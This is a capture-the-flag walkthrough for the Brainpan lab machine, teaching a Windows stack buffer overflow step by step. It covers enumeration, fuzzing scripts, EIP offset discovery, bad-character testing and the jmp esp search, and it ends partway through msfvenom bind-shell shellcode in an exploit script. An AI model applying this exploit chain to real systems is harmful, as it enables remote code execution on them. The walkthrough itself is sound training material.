
# Walkthrough

## Basic Enumeration

Before starting the machine, we connect to the OpenVPN network using openvpn:
```
sudo openvpn ./vpn-file
```

After starting the machine, we get the IP address of our target. 
For convenience i create an environment variable that contains the IP:

```
export ip=10.10.10.10
```

Now we perform a portscan using nmap
```
nmap -p- $ip -T4 -O -osscan-guess
```
<br>

We use option:<br>
**-p-** to scan for all ports,<br>
**-T4** for selecting a fast portscan (T<0-5>)<br>
**-O** to fingerprint the operating system<br>
**-osscan-guess** to guess the operating system when the OS fingerprint (-O) is inaccurate<br>


![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/00872e20-ea3e-418f-b303-02ad7c527e94)

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/9d24dd32-b1f3-4a14-b2c0-fb1d470649cb)

According to the output of nmap, there is a webserver running on port 10000. Now, we will scan the webserver and search for hidden files/folders using gobuster:
```
gobuster dir -u http://$ip:10000/ -w /usr/share/wordlists/ -x ".exe"
```
**-u** to specify the url<br>
**-w** to specify a wordlist<br>
**-x** to specify a file extension that should be added to each entry to the list additionally<br>

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/5e2a90d5-0dc7-4372-aabf-8c5eac041671)

By running the previous command, we find a hidden directory that is accessible on the webserver. We do manual enumeration and find a file called brainpan.exe, which seems to be the program running on the victim machine on port 9999, which must be vulnerable to a buffer overflow as stated in the description of the machine (we will verify it in the following). 

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/1ef441b5-6780-4677-888b-ef6bf63918e6)

We download the file found using wget.

```
wget http://$ip:10000/brainpan.exe
```
<br>

We will transfer the file over to one of our Windows VMs to test if the executable is vulnerable to a buffer overflow and craft our payload. The windows VM will act as our victim. We use python to create a webserver that hosts the file.

```
python3 -m http.server 80
```
<br>

**-m** to specify the http.server module<br>
**80** to specify the port<br>
<br>

On our own Windows VM we will download the file using PowerShell:
```
iwr -uri http://our-attacker-vm-ip(other interface)/brainpan.exe -outfile brainpan.exe
```

**iwr** is an alias for Invoke-WebRequest<br>
**-uri** to specify the url<br>
**-outfile** to specify the relative destination path<br>

<br>
We will use Immunity Debugger to debug the executable. 
<br>

It can be downloaded [here](https://www.immunityinc.com/products/debugger/).

## Verifying the buffer overflow vulnerability

Right click on Immunity Debugger and hit "Run as administrator". Once opened, goto File -> Open and select the executable, then once loaded click on the red arrow to the right to unpause.

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/db4cc07e-008f-4aa4-9afa-cf022b05c456)
<br>
As we can see in the bottom-right-hand corner, the program is now running:

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/13b5e01d-5ec3-46e6-813c-e31afa8500f1)

We now craft our script in python that will send our payload:

```
#!/usr/bin/env python3

import sys,socket

garbage = b'A'*99999

try:
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socket.connect(("our-windows-vm-victim", 9999))
  socket.send(garbage)
except:
  print("Couldn't connct to our windows vm")
```

We execute the python script using python3
```
python3 script.py
```

We don't get any output, which means it ran without any errors. On the windows VM, we see that the program crashed because a segmentation fault occurred.

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/ea43186d-4c3c-4909-beb8-c388c117d5b0)


## Craft our payload to get a shell on the target

Restart Immunity Debugger and start the program (unpause it).

### Get the amount of bytes to overwrite EIP

We use metasploit to create a pattern, so a string of characters that have a unique order. 

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

This command will output this string:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
```

We now edit our python script to the following
```
#!/usr/bin/env python3

import sys,socket

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9" # this is the output of the last command

try:
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socket.connect(("our-windows-vm-victim", 9999))
  socket.send(payload.encode()) # We use encode because the payload variable is not a byte string as in the last script
except:
  print("Couldn't connct to our windows vm")
```


Now we will execute the script using python3.
```
python3 script.py
```


On the windows machine we get another access violation and see that the program stopped again. Now we copy the value of the EIP register to the windows machine. 

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/9dc84f0d-d4e9-4924-8754-a0e43e74b625)


We see that the EIP has this value 35724134. The EIP is the instruction pointer in x86 architecture. This means that this register holds the address of the next instruction to be executed. This register is 4 bytes(32 bit) big. Now we run the following command on our attacker machine, which uses metasploit again. 

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 35724134
```
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/3a1f82c5-6356-47fc-92af-3ec5d6d64ba0)

This tells us that we need to send 524 bytes till we overwrite the EIP. 


#### To proof this, we will modify the python script again:
```
#!/usr/bin/env python3

import sys,socket

payload = b"A"*524+b"ZZZZ" # 4 times Z, because 1 x Z is 1 byte and eip is 32 bit (=4 bytes big)

try:
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socket.connect(("our-windows-vm-victim", 9999))
  socket.send(payload)) # We dont use .encode() because payload is a byte string
except:
  print("Couldn't connct to our windows vm")
```

This will overwrite the EIP with ZZZZ (in hex). To lookup what Z is in hex, we use the manpage for ascii:

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/88cc0891-cb80-48a5-a9a8-2f5a75cd5337)

As we can see in the manpage of ascii, the hex representation of Z is 5A, which means that the EIP must be (5A * 4) = 5A5A5A5A. This can be verified after running the python script and causing a segmentation fault again.

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/62c94619-bb6d-4ab8-9d82-a0e340218199)
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/1dd9fc7e-64ec-43d1-9fee-b651314b1aed)


### Find bad characters

To find bad characters we will use a list of bad characters from [github](https://github.com/cytopia/badchars)

```
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```


Now we modify the python script again to the following
```
#!/usr/bin/env python3

import sys,socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload = b"A"*524 + badchars.encode() 

try:
  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  socket.connect(("our-windows-vm-victim", 9999))
  socket.send(payload)) # We dont use .encode() because payload is a byte string
except:
  print("Couldn't connct to our windows vm")
```

After running the script, we go back to our windows vm and right click on the ESP register and proceed by selecting Follow in Dump. On the bottom-left-hand-corner we see 2 columns. In the right column are the ascii values of our bad characters that we inputed and on the left are the corresponding hex values. Now we need to find the start of our characters we sent, this should start at hex 01 and go to 7F. These hex values should be in the proper order and should always add 1 to the previous hex value. If this is the case, then the only bad character is \x00. Otherwise the hex value that would normally be at the position is also bad characters. We have to note them down for later use.  

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/b8e87a6c-9710-4960-b13f-041f3d64d98e)
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/1bcfc708-659a-4add-b489-f8a0cb0ce2f1)

The bad characters are: \x00



### Find an address that we can pass into the eip to make it run our code

We will not find an address that we could overwrite the eip with that it executes our code. To archieve that we will utilize the metasploit-framework again

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Now we enter **jmp esp**, which is an assembly instruction that will make the program continue execution on the code that is on the stack, which will be our payload.

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/472b692c-2f9b-4c1b-a47c-99ad37685a1f)

This will output FFE4, which is the opcode equivalent of jmp esp. We will also note that down.

Now we will use a module for Immunity Debugger, which you can download [here](https://raw.githubusercontent.com/corelan/mona/master/mona.py). Move this into this folder: ```C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands```

Restart Immunity Debugger again. In white line on the bottom, type 
```
!mona modules
```

 This will list all the libraries used by the executable "brainpan.exe" and the protections like ASLR (Adress Space Layout Randomization),.
![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/b16fa8c4-6dee-4b85-9692-63d3d80b96d5)

 Here we are looking for the executable that is being used that has the least protections, so the executables where the protections are set to False.

 In this case brainpan.exe uses its own functions which is why it's listed here and has the least protections. We are looking for the least protections, because our plan is to put the "jmp esp" instruction into the eip register, which is the register that holds the address of the next instruction that will be executed. We need to find out the address of any "jmp esp" instruction, so we can put it into the instruction pointer (eip). Having the least protections enabled is good because finding the base address of this "jmp esp" instruction will be much easier. Now we will search for the appearances and base addresses of the jmp esp instruction (using its opcode equivalent "\xff\xe4") in the brainpan.exe binary itself (you can also use any other dll as long as it only has a few protections).  

```
!mona find -s "\xff\xe4" -m brainpan.exe
```

![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/f50d1a77-5f95-43a0-99dc-94057eccd09d)

So now we have the offset (how many bytes until the EIP is overwritten), the address of the "JMP ESP" instruction which will tell the program to execute the JMP ESP instruction which will jump to whatever is on the stack. 


Now we need some padding, which are called nop's. Here you can use "\x90" and use 16 - 32 bytes padding. Depending on the space that you have available, in some situations you will have to adjust the size of the nops. In this case it doesn't matter and I will use 32 bytes because my payload will not reach the limit. If your payload is too big, use less nops.


We have the offset, the address of the jmp esp instruction and the nops and now we need the shellcode that is executed after the program executes jmp esp (because the shellcode will be on top of the stack). Msfvenom can be used to generate the shellcode. 


We will use a non staged, bind_tcp payload, because I had problems using the staged bind_tcp payload. We generate it using the following command:

```
msfvenom -p windows/shell_bind_tcp RHOST=*windows_machine_ip* LPORT=1339 EXITFUNC=thread -f python -a x86 -b "\x00" -v shellcode
```
p = \*payload type\*
RHOST=\*target ip\*
LPORT=\*port that is opened on the target that hosts the shell\*
EXITFUNC=\*the shellcode will be executed in a thread on the target\*
f = \*the language that the exploit is written in that the generated shellcode is in the correct format, e.g. in python there is no ; at the end of an instruction, but in C\*
a = architecture
b = bad characters (in this case we only found \x00)
v = variable_name of the shellcode


So far this is our exploit.py:
```
#!/usr/bin/env python3

import socket
import time

ip = "windows_machine_ip"
# 311712F3
offset = b"A"*524

shellcode =  b""
shellcode += b"\xd9\xe1\xb8\xbe\x2b\x6d\xb3\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x53\x31\x43\x17\x03\x43\x17"
shellcode += b"\x83\x7d\x2f\x8f\x46\x7d\xd8\xcd\xa9\x7d\x19"
shellcode += b"\xb2\x20\x98\x28\xf2\x57\xe9\x1b\xc2\x1c\xbf"
shellcode += b"\x97\xa9\x71\x2b\x23\xdf\x5d\x5c\x84\x6a\xb8"
shellcode += b"\x53\x15\xc6\xf8\xf2\x95\x15\x2d\xd4\xa4\xd5"
shellcode += b"\x20\x15\xe0\x08\xc8\x47\xb9\x47\x7f\x77\xce"
shellcode += b"\x12\xbc\xfc\x9c\xb3\xc4\xe1\x55\xb5\xe5\xb4"
shellcode += b"\xee\xec\x25\x37\x22\x85\x6f\x2f\x27\xa0\x26"
shellcode += b"\xc4\x93\x5e\xb9\x0c\xea\x9f\x16\x71\xc2\x6d"
shellcode += b"\x66\xb6\xe5\x8d\x1d\xce\x15\x33\x26\x15\x67"
shellcode += b"\xef\xa3\x8d\xcf\x64\x13\x69\xf1\xa9\xc2\xfa"
shellcode += b"\xfd\x06\x80\xa4\xe1\x99\x45\xdf\x1e\x11\x68"
shellcode += b"\x0f\x97\x61\x4f\x8b\xf3\x32\xee\x8a\x59\x94"
